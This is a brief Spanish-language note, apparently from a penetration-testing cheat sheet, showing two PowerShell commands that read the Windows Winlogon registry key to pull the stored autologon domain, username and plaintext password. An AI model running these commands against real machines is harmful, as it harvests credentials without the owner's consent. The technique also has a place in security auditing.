---
title: Extraer contraseñas del registro de Windows
---

```
cd "HKLM:\\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty . | Select-Object DefaultDomainName, DefaultUserName, DefaultPassword
```

![](./img/winlogon-pass.png)